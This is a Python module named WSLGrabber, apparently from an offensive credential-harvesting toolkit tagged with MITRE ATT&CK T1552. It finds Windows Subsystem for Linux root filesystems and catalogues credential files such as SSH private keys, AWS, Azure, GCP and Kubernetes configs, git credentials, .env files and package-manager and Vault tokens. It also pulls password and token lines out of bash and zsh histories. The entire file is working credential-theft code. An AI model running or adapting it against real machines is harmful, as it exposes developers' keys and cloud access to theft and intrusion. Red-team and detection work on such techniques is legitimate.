"""
WSLGrabber -- Extract credentials from Windows Subsystem for Linux

WSL stores its entire Linux filesystem at a path accessible from Windows:
%LocalAppData%/Packages/CanonicalGroupLimited.Ubuntu*/LocalState/rootfs/

No mounting needed -- direct file access. Developers often have different
(sometimes more privileged) credentials in their WSL environment than
on their Windows side: SSH keys, .env files, bash_history with passwords,
cloud CLI configs, git credentials, database configs.

MITRE ATT&CK: T1552.001 (Credentials In Files)
"""

from __future__ import annotations

import glob
import os
import re

from .base import GrabberContext, GrabberModule
from .models import ExtractedCredential, GrabberResult, GrabberStatus, PrivilegeLevel
from .utils import safe_read_text

# Credential-bearing files to extract from WSL rootfs
_WSL_TARGETS = [
    # SSH keys
    ("home/*/", ".ssh/id_rsa", "SSH Private Key"),
    ("home/*/", ".ssh/id_ed25519", "SSH Private Key (ed25519)"),
    ("home/*/", ".ssh/id_ecdsa", "SSH Private Key (ECDSA)"),
    ("home/*/", ".ssh/config", "SSH Config"),
    # Shell history (passwords in commands)
    ("home/*/", ".bash_history", "Bash History"),
    ("home/*/", ".zsh_history", "Zsh History"),
    ("root/", ".bash_history", "Root Bash History"),
    # Cloud credentials
    ("home/*/", ".aws/credentials", "AWS Credentials"),
    ("home/*/", ".aws/config", "AWS Config"),
    ("home/*/", ".azure/accessTokens.json", "Azure Tokens"),
    ("home/*/", ".config/gcloud/application_default_credentials.json", "GCP Credentials"),
    ("home/*/", ".kube/config", "Kubernetes Config"),
    ("home/*/", ".docker/config.json", "Docker Config"),
    # Git credentials
    ("home/*/", ".git-credentials", "Git Credentials"),
    ("home/*/", ".gitconfig", "Git Config"),
    # Environment files
    ("home/*/", ".env", "Environment File"),
    ("home/*/", ".env.local", "Local Environment File"),
    # Database credentials
    ("home/*/", ".pgpass", "PostgreSQL Passwords"),
    ("home/*/", ".my.cnf", "MySQL Config"),
    ("home/*/", ".netrc", "Netrc Credentials"),
    # Package manager tokens
    ("home/*/", ".npmrc", "NPM Token"),
    ("home/*/", ".pypirc", "PyPI Token"),
    # Vault / secrets
    ("home/*/", ".vault-token", "Vault Token"),
    # Terraform
    ("home/*/", ".terraform.d/credentials.tfrc.json", "Terraform Token"),
]

# Patterns to flag in bash_history
_HISTORY_SECRET_PATTERNS = [
    re.compile(r"(?:password|passwd|pwd|pass)\s*[=:]\s*\S+", re.IGNORECASE),
    re.compile(r"(?:mysql|psql|mongo)\s+.*-p\s*\S+", re.IGNORECASE),
    re.compile(r"(?:curl|wget)\s+.*(?:token|key|auth)\s*[=:]\s*\S+", re.IGNORECASE),
    re.compile(r"export\s+(?:.*PASSWORD|.*SECRET|.*TOKEN|.*KEY)\s*=", re.IGNORECASE),
]


class WSLGrabber(GrabberModule):
    name = "wsl"
    description = "Extract credentials from WSL Linux filesystem (SSH keys, history, cloud creds)"
    min_privilege = PrivilegeLevel.USER
    supported_platforms = ("Windows",)
    default_enabled = True

    def preflight_check(self, context: GrabberContext) -> bool:
        rootfs_paths = self._find_wsl_rootfs(context)
        return len(rootfs_paths) > 0

    def execute(self, context: GrabberContext) -> GrabberResult:
        result = GrabberResult(module_name=self.name)

        rootfs_paths = self._find_wsl_rootfs(context)
        if not rootfs_paths:
            result.status = GrabberStatus.SKIPPED
            return result

        for distro_name, rootfs in rootfs_paths:
            self._scan_rootfs(rootfs, distro_name, result)

        result.status = GrabberStatus.COMPLETED
        return result

    @staticmethod
    def _find_wsl_rootfs(context: GrabberContext) -> list[tuple[str, str]]:
        """Find all WSL distribution rootfs directories."""
        found = []
        packages_dir = os.path.join(
            context.appdata_local or "", "Packages"
        )
        if not os.path.isdir(packages_dir):
            return found

        # WSL distro patterns
        patterns = [
            "CanonicalGroupLimited.Ubuntu*",
            "CanonicalGroupLimited.Ubuntu20*",
            "CanonicalGroupLimited.Ubuntu22*",
            "CanonicalGroupLimited.Ubuntu24*",
            "TheDebianProject.DebianGNULinux*",
            "KaliLinux.KaliLinuxRolling*",
            "SUSE.openSUSE*",
            "WhitewaterFoundryLtd.Co.Fedora*",
        ]

        for pattern in patterns:
            for distro_dir in glob.glob(os.path.join(packages_dir, pattern)):
                rootfs = os.path.join(distro_dir, "LocalState", "rootfs")
                if os.path.isdir(rootfs):
                    distro_name = os.path.basename(distro_dir).split("_")[0]
                    found.append((distro_name, rootfs))

        return found

    def _scan_rootfs(self, rootfs: str, distro: str,
                     result: GrabberResult) -> None:
        """Scan a WSL rootfs for credential files."""
        for home_pattern, rel_path, description in _WSL_TARGETS:
            # Expand home/* to actual user directories
            search_base = os.path.join(rootfs, home_pattern)
            for base_dir in glob.glob(search_base):
                fpath = os.path.join(base_dir, rel_path)
                if not os.path.isfile(fpath):
                    continue

                try:
                    size = os.path.getsize(fpath)
                except OSError:
                    continue

                if size == 0:
                    continue

                # Determine credential type
                cred_type = "key"
                if "history" in rel_path.lower():
                    cred_type = "password"
                elif "credentials" in rel_path.lower() or "token" in rel_path.lower():
                    cred_type = "token"
                elif rel_path.endswith((".env", ".env.local", ".pgpass", ".netrc")):
                    cred_type = "password"

                # Extract username from path
                path_parts = fpath.replace(rootfs, "").strip(os.sep).split(os.sep)
                wsl_user = path_parts[1] if len(path_parts) > 1 and path_parts[0] == "home" else "root"

                notes = f"WSL/{distro}: {description}"

                # For history files, scan for secrets
                if "history" in rel_path.lower():
                    content = safe_read_text(fpath)
                    if content:
                        secret_lines = []
                        for line in content.splitlines()[-500:]:  # last 500 lines
                            for pattern in _HISTORY_SECRET_PATTERNS:
                                if pattern.search(line):
                                    secret_lines.append(line.strip()[:100])
                                    break
                        if secret_lines:
                            notes += f"; {len(secret_lines)} secret(s) in history"
                            for secret in secret_lines[:5]:
                                result.credentials.append(ExtractedCredential(
                                    source_module=self.name,
                                    credential_type="password",
                                    target_application=f"WSL History ({distro})",
                                    username=wsl_user,
                                    decrypted_value=secret,
                                    notes=f"WSL bash_history: {wsl_user}@{distro}",
                                    mitre_technique="T1552.003",
                                    source_file=fpath,
                                ))

                result.credentials.append(ExtractedCredential(
                    source_module=self.name,
                    credential_type=cred_type,
                    target_application=f"WSL ({distro})",
                    url=fpath,
                    username=wsl_user,
                    notes=notes,
                    mitre_technique="T1552.001",
                    source_file=fpath,
                ))

                # Score based on type
                score = 150 if "ssh" in rel_path.lower() or "key" in rel_path.lower() else 100
                if "credentials" in rel_path.lower() or "token" in rel_path.lower():
                    score = 125
                result.findings.append(self.make_finding(
                    file_path=fpath,
                    description=f"WSL/{distro}: {description}",
                    score=score,
                    matched_value=f"{wsl_user}@{distro}:{rel_path}",
                ))
